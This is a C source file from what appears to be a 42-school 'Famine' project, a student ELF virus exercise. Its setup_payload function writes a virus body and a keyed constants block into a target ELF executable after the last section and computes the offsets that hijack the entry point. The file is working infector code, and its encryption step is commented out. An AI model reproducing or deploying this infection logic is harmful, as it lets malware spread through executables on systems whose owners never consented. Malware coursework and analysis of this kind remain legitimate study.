/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   setup_payload.c                                    :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/07 10:16:42 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include <stdbool.h>
#include <linux/elf.h>
#include "utils.h"
#include "infect.h"
#include "errors.h"
#include "famine.h"

/*
**  Elf64_packer memory overview
**  ============================
**
**                          .        .
**                          |  ...   |
**              p_offset -> |========| PT_LOAD  - relative_pt_load_address
**                          |  ...   |          ^
**                          |  ...   |          |
**             sh_offset -> |--------|          |
**                      |   |  ...   |          |
**                      V   |  ...   |          |
**    offset_in_section -   |>>>>>>>>| entry    |- relative_entry_address
**                          |  ...   |          |^
**                          |--------|          ||
**                          |  ...   |          ||
**                          |  ...   |          ||
**   end_of_last_section -> |--------| -  -  -  -- -  -  -  -  -  -
**         @famine_entry -> |@@@@@@@@| |                          |
**                          |@      @| |                          |
**                          |@      @| |                          |
**                          |@@@@@@@@| V                          |
**         packed @virus -> |~~~~~~~~| - relative_virus_addresss  |
**                          |########| |                          |
**                          |########| |                          |
**                          |########| |                          |
**                          |########| V                          V
** @_start (placeholder) -> |~~~~~~~~| - virus_size               - payload_size
**                          |  ...   |
**                          |  ...   |
**                          |========|
**                          |  ...   |
**                          .        .
**
** Note that relative_virus_addresss is in the opposite direction !
*/

# define CALL_INSTR_SIZE	5 /* sizeof "call mark_below" -> e8 2000 0000 */
# define SECRET_SIGNATURE	(char[10]){'4','2','R','e','m','b','l','a','i','\0'}
# define SECRET_LEN		10

static void	generate_key(char *buffer, size_t len)
{
	ft_getrandom(buffer, len);
}

static void	init_constants(struct client_info *constants, \
			const struct entry *original_entry, \
			const struct endians_pointer endians)
{
	ft_memcpy(constants->key, SECRET_SIGNATURE, SECRET_LEN);
	generate_key((char *)constants->key + SECRET_LEN, 16 - SECRET_LEN);

	const size_t		end_of_last_section = original_entry->end_of_last_section;
	const Elf64_Off		p_offset  = endians.endian_8(original_entry->safe_phdr->p_offset);
	const Elf64_Xword	p_memsz   = endians.endian_8(original_entry->safe_phdr->p_memsz);
	const Elf64_Off		sh_offset = endians.endian_8(original_entry->safe_shdr->sh_offset);
	const size_t		rel_text  = end_of_last_section - sh_offset;

	constants->relative_pt_load_address = end_of_last_section - p_offset;
	constants->pt_load_size             = p_memsz;
	constants->relative_virus_address   = (uint64_t)virus - (uint64_t)famine_entry;
	constants->relative_entry_address   = rel_text - original_entry->offset_in_section;
	constants->virus_size               = (uint64_t)_start - (uint64_t)virus;
}

bool		setup_payload(const struct entry *original_entry, \
			const struct endians_pointer endians, \
			const struct safe_pointer info)
{
	struct client_info	constants;

	init_constants(&constants, original_entry, endians);

	const size_t	payload_size = (uint64_t)_start - (uint64_t)famine_entry;
	const size_t	virus_size   = constants.virus_size;
	const size_t	payload_off  = original_entry->end_of_last_section;
	const size_t	virus_off    = payload_off + constants.relative_virus_address;

	void	*payload_location    = safe(payload_off, payload_size);
	void	*constants_location  = safe(payload_off + CALL_INSTR_SIZE, sizeof(constants));
	void	*virus_location      = safe(virus_off, virus_size);

	if (!payload_location || !constants_location || !virus_location)
		return errors(ERR_CORRUPT, "wildly unreasonable\nsetup_payload");

	ft_memcpy(payload_location, (void *)famine_entry, payload_size);
	ft_memcpy(constants_location, &constants, sizeof(constants));
	// encrypt(32, virus_location, constants.key, virus_size);

	return true;
}
